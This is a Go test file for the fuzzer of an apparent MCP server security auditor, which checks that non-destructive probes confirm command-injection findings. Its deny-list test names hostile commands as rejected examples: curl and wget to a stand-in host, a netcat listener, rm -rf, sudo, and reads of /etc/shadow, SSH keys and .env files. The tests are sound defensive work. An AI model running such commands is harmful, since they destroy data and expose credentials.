package fuzzer

import (
	"encoding/json"
	"errors"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/kodivante/MCPwn/v3/internal/auditor"
)

type stubCaller struct {
	calls   int32
	respond func(call int, arguments json.RawMessage) (json.RawMessage, error)
}

func (s *stubCaller) CallTool(name string, arguments json.RawMessage) (json.RawMessage, error) {
	call := int(atomic.AddInt32(&s.calls, 1))
	return s.respond(call, arguments)
}

type probeArguments struct {
	Cmd string `json:"cmd"`
}

func textResponse(text string) (json.RawMessage, error) {
	return json.Marshal(probeResponse{Content: []probeContent{{Type: "text", Text: text}}})
}

func reflectCaller() *stubCaller {
	return &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		var args probeArguments
		if err := json.Unmarshal(arguments, &args); err != nil {
			return nil, err
		}
		return textResponse(args.Cmd)
	}}
}

func sanitizeCaller() *stubCaller {
	return &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		return textResponse("command rejected by security policy")
	}}
}

func flakyCaller() *stubCaller {
	return &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		if call == 1 {
			return nil, errors.New("transient transport glitch")
		}
		var args probeArguments
		if err := json.Unmarshal(arguments, &args); err != nil {
			return nil, err
		}
		return textResponse(args.Cmd)
	}}
}

func executingCaller() *stubCaller {
	return &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		var args probeArguments
		if err := json.Unmarshal(arguments, &args); err != nil {
			return nil, err
		}
		fields := strings.Fields(args.Cmd)
		if len(fields) == 2 && fields[0] == "cat" {
			data, err := os.ReadFile(fields[1])
			if err != nil {
				return textResponse("file not readable")
			}
			return textResponse(string(data))
		}
		return textResponse(args.Cmd)
	}}
}

func blockedCaller() *stubCaller {
	return &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		time.Sleep(300 * time.Millisecond)
		return textResponse("late response")
	}}
}

func cmdFinding() auditor.Finding {
	return auditor.Finding{
		Severity:   auditor.SeverityCritical,
		RuleID:     "CmdInjection01",
		TargetTool: "system_exec",
		ParamPath:  "inputSchema.properties[cmd]",
	}
}

func builtinPayloadByName(name string) Payload {
	for _, payload := range BuiltinPayloads() {
		if payload.Name == name {
			return payload
		}
	}
	return Payload{}
}

func TestValidatePayloadDenyList(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{name: "echo marker", command: "echo mcpwn_probe_{uuid}"},
		{name: "controlled sleep", command: "sleep 2"},
		{name: "temp file read", command: "cat {tempfile}"},
		{name: "remove files", command: "rm -rf /tmp/x", wantErr: true},
		{name: "windows delete", command: "del something", wantErr: true},
		{name: "exfiltrate via curl", command: "curl http://evil.test", wantErr: true},
		{name: "wget download", command: "wget http://evil.test", wantErr: true},
		{name: "netcat listener", command: "nc -l 9999", wantErr: true},
		{name: "remote shell", command: "ssh host", wantErr: true},
		{name: "privilege escalation", command: "sudo ls", wantErr: true},
		{name: "permission change", command: "chmod 777 file", wantErr: true},
		{name: "output redirect", command: "echo x > /tmp/y", wantErr: true},
		{name: "append redirect", command: "echo x >> /tmp/y", wantErr: true},
		{name: "pipe chain", command: "cat a | cat b", wantErr: true},
		{name: "command chain", command: "echo a && echo b", wantErr: true},
		{name: "passwd read", command: "cat /etc/passwd", wantErr: true},
		{name: "shadow read", command: "cat /etc/shadow", wantErr: true},
		{name: "ssh keys", command: "cat ~/.ssh/id_rsa", wantErr: true},
		{name: "env secrets", command: "cat .env", wantErr: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			payload := Payload{Name: "test", RuleID: "CmdInjection01", Template: tc.command}
			err := ValidatePayload(payload)
			if tc.wantErr && err == nil {
				t.Error("expected deny-list rejection")
			}
			if !tc.wantErr && err != nil {
				t.Errorf("unexpected rejection: %v", err)
			}
		})
	}
}

func TestBuiltinPayloadsPassDenyList(t *testing.T) {
	for _, payload := range BuiltinPayloads() {
		if err := ValidatePayload(payload); err != nil {
			t.Errorf("builtin payload %s rejected: %v", payload.Name, err)
		}
	}
}

func TestNewEngineRejectsForbiddenPayloads(t *testing.T) {
	payload := Payload{Name: "evil", RuleID: "CmdInjection01", Template: "curl http://evil.test"}
	if _, err := NewEngine(reflectCaller(), Options{Payloads: []Payload{payload}}); err == nil {
		t.Error("expected engine creation to reject forbidden payload")
	}
}

func TestConfirmFindingsReflected(t *testing.T) {
	engine, err := NewEngine(reflectCaller(), Options{})
	if err != nil {
		t.Fatal(err)
	}

	results := engine.ConfirmFindings([]auditor.Finding{cmdFinding()})
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if !results[0].Confirmed {
		t.Fatal("expected confirmed finding")
	}
	if !strings.Contains(results[0].Evidence, markerPrefix) {
		t.Errorf("expected marker evidence, got %s", results[0].Evidence)
	}
}

func TestConfirmFindingsSanitized(t *testing.T) {
	engine, err := NewEngine(sanitizeCaller(), Options{})
	if err != nil {
		t.Fatal(err)
	}

	results := engine.ConfirmFindings([]auditor.Finding{cmdFinding()})
	if results[0].Confirmed {
		t.Error("expected unconfirmed finding")
	}
	if results[0].Evidence != "" {
		t.Errorf("expected empty evidence, got %s", results[0].Evidence)
	}
}

func TestConfirmFindingsRetry(t *testing.T) {
	caller := flakyCaller()
	engine, err := NewEngine(caller, Options{})
	if err != nil {
		t.Fatal(err)
	}

	results := engine.ConfirmFindings([]auditor.Finding{cmdFinding()})
	if !results[0].Confirmed {
		t.Error("expected confirmation after retry")
	}
	if got := atomic.LoadInt32(&caller.calls); got != 2 {
		t.Errorf("expected 2 calls (1 retry), got %d", got)
	}
}

func TestConfirmFindingsTimeoutAborts(t *testing.T) {
	caller := blockedCaller()
	engine, err := NewEngine(caller, Options{Timeout: 50 * time.Millisecond})
	if err != nil {
		t.Fatal(err)
	}

	findings := []auditor.Finding{cmdFinding(), cmdFinding()}
	results := engine.ConfirmFindings(findings)
	if results[0].Confirmed || results[1].Confirmed {
		t.Error("expected no confirmations after timeout")
	}
	if got := atomic.LoadInt32(&caller.calls); got != 1 {
		t.Errorf("expected engine abort after first timeout, got %d calls", got)
	}
}

func TestConfirmFindingsTiming(t *testing.T) {
	slowCaller := &stubCaller{respond: func(call int, arguments json.RawMessage) (json.RawMessage, error) {
		time.Sleep(100 * time.Millisecond)
		return textResponse("done")
	}}
	payload := Payload{
		Name:     "timing",
		RuleID:   "CmdInjection01",
		Template: "sleep 2",
		MinDelay: 50 * time.Millisecond,
	}
	engine, err := NewEngine(slowCaller, Options{Payloads: []Payload{payload}, Timeout: time.Second})
	if err != nil {
		t.Fatal(err)
	}

	results := engine.ConfirmFindings([]auditor.Finding{cmdFinding()})
	if !results[0].Confirmed {
		t.Fatal("expected timing confirmation")
	}
	if !strings.Contains(results[0].Evidence, "delayed") {
		t.Errorf("expected delay evidence, got %s", results[0].Evidence)
	}
}

func TestConfirmFindingsTempFile(t *testing.T) {
	engine, err := NewEngine(executingCaller(), Options{Payloads: []Payload{builtinPayloadByName("tempFileRead")}})
	if err != nil {
		t.Fatal(err)
	}

	results := engine.ConfirmFindings([]auditor.Finding{cmdFinding()})
	if !results[0].Confirmed {
		t.Fatal("expected temp file confirmation")
	}
}

func TestArgumentKey(t *testing.T) {
	tests := []struct {
		name      string
		paramPath string
		want      string
	}{
		{name: "property path", paramPath: "inputSchema.properties[cmd]", want: "cmd"},
		{name: "nested path", paramPath: "inputSchema.properties[config].properties[cmd]", want: "cmd"},
		{name: "array items path", paramPath: "inputSchema.properties[commands].items", want: "commands"},
		{name: "root path", paramPath: "root", want: ""},
		{name: "bare schema path", paramPath: "inputSchema", want: ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := argumentKey(tc.paramPath); got != tc.want {
				t.Errorf("expected %s, got %s", tc.want, got)
			}
		})
	}
}
